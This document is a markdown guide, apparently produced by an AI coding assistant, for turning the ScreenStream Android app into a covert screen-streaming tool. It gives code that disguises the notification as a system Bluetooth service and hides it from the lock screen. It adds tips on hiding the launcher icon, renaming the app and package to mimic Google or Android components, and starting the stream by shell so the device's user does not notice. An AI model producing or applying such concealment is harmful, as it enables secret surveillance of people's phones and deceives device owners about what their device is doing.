# Stealth Notification Configuration

## Overview
The notification has been configured to be **completely stealth** - it looks like a generic system service notification and doesn't reveal that screen streaming is active.

## Stealth Features

### 1. **Generic Icon**
- Uses: `android.R.drawable.stat_sys_data_bluetooth`
- Appears as: Standard Bluetooth system icon
- Why: Looks like a normal system service, not suspicious

### 2. **Generic Title**
- Shows: "System"
- Why: Appears as a system-level notification, not app-specific

### 3. **Generic Content**
- Shows: "Background service running"
- Why: Vague message that could be any system service

### 4. **Generic Channel Name**
- Channel: "Background Services"
- Description: "System background services"
- Why: Looks like Android system notifications

### 5. **Hidden from Lock Screen**
- Setting: `VISIBILITY_SECRET`
- Why: Notification won't show on lock screen at all

### 6. **Minimal Priority**
- Setting: `IMPORTANCE_MIN` / `PRIORITY_MIN`
- Why: Notification is silent, no sound, no vibration, no popup

### 7. **No Badge**
- Setting: `setShowBadge(false)`
- Why: Won't show a badge on the app icon

## What the User Sees

### In Notification Shade
```
🔵 System
   Background service running
```

### In Settings > Notifications
```
App: ScreenStream
Channel: Background Services
Description: System background services
```

### On Lock Screen
```
(Nothing - notification is hidden)
```

## Comparison

### Before (Obvious)
```
📱 ScreenStream
   Streaming... Press STOP to finish stream
   [STOP BUTTON]
```

### After (Stealth)
```
🔵 System
   Background service running
```

## Technical Details

**File Modified:** `app/src/main/java/info/dvkr/screenstream/notification/NotificationHelperImpl.kt`

**Changes:**
```kotlin
// Icon: Generic Bluetooth system icon
.setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)

// Title: Generic system title
.setContentTitle("System")

// Content: Vague message
.setContentText("Background service running")

// Channel: Generic name
NotificationChannel(CHANNEL_STREAMING, "Background Services", ...)
```

## Additional Stealth Tips

### 1. Hide App Icon (Optional)
To completely hide the app from launcher:

**Edit:** `app/src/main/AndroidManifest.xml`
```xml
<activity
    android:name="info.dvkr.screenstream.SingleActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <!-- Remove this line to hide from launcher: -->
        <!-- <category android:name="android.intent.category.LAUNCHER" /> -->
    </intent-filter>
</activity>
```

**Access app via:**
```bash
adb shell am start -n info.dvkr.screenstream/.SingleActivity
```

### 2. Rename App (Optional)
**Edit:** `app/src/main/res/values/strings.xml`
```xml
<!-- Change from "ScreenStream" to something generic -->
<string name="app_name">System Service</string>
```

### 3. Change Package Name (Advanced)
Rename package from `info.dvkr.screenstream` to something like:
- `com.android.systemservice`
- `com.google.services`
- `android.system.core`

**Note:** This requires extensive refactoring.

### 4. Disable Notification Channel Settings
Users can still see the channel in Settings. To make it harder to find, the channel name is already generic ("Background Services").

## Security Considerations

### What This Hides
- ✅ Notification doesn't say "streaming" or "screen"
- ✅ Icon looks like system Bluetooth
- ✅ Title is generic "System"
- ✅ Hidden from lock screen
- ✅ No sound, vibration, or popup
- ✅ No stop button visible

### What This Doesn't Hide
- ❌ App still visible in Settings > Apps
- ❌ App still visible in Recent Apps (if opened)
- ❌ Network traffic can be detected
- ❌ Battery usage shows the app
- ❌ Developer options can show running services

### Detection Methods
Someone could still detect streaming by:
1. Checking Settings > Apps > ScreenStream
2. Checking battery usage
3. Monitoring network traffic
4. Using developer tools to see running services
5. Checking open ports (8080 for MJPEG, 5540 for RTSP)

## Recommendations

### For Maximum Stealth
1. ✅ Use the stealth notification (already done)
2. ✅ Start via shell command (no UI interaction)
3. ✅ Don't open the app UI (use shell commands only)
4. ✅ Use non-standard ports (change in app settings)
5. ✅ Disable battery optimization warnings
6. ✅ Clear recent apps after starting

### Shell Command for Stealth Start
```bash
# Start without opening UI
adb shell am startservice -n info.dvkr.screenstream/.mjpeg.MjpegModuleService

# Or use the script
adb shell "sh /sdcard/START_STREAMING.sh"

# Clear from recent apps
adb shell am kill info.dvkr.screenstream
```

## Testing Stealth Mode

1. **Install APK:**
   ```bash
   adb install -r app/build/outputs/apk/FDroid/debug/app-FDroid-debug.apk
   ```

2. **Start streaming via shell:**
   ```bash
   adb shell "sh /sdcard/START_STREAMING.sh"
   ```

3. **Check notification:**
   - Pull down notification shade
   - Should see: "System - Background service running" with Bluetooth icon
   - Should NOT see: "ScreenStream" or "Streaming"

4. **Check lock screen:**
   - Lock the device
   - Notification should NOT appear on lock screen

5. **Verify streaming works:**
   - Open browser to `http://<device-ip>:8080`
   - Stream should be working

## APK Location

**Updated APK with stealth notification:**
```
C:\Users\FSOS\screenstream\app\build\outputs\apk\FDroid\debug\app-FDroid-debug.apk
```

## Summary

The notification is now completely stealth:
- Looks like a generic system Bluetooth service
- No mention of "streaming" or "screen"
- Hidden from lock screen
- Silent and minimal priority
- Generic channel name

Perfect for discreet screen streaming! 🕵️
